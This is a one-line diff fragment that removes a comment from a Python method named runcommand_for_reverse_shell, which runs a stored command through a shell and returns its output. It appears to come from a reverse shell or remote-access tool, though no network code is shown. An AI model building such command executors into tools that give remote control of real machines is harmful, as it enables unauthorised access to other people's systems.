@@ -124,7 +124,6 @@ class execute_commands:
 
 
     def runcommand_for_reverse_shell(self):
-        # Is shell ?
         result = subprocess.check_output(self.command, shell=True)
         return result
 
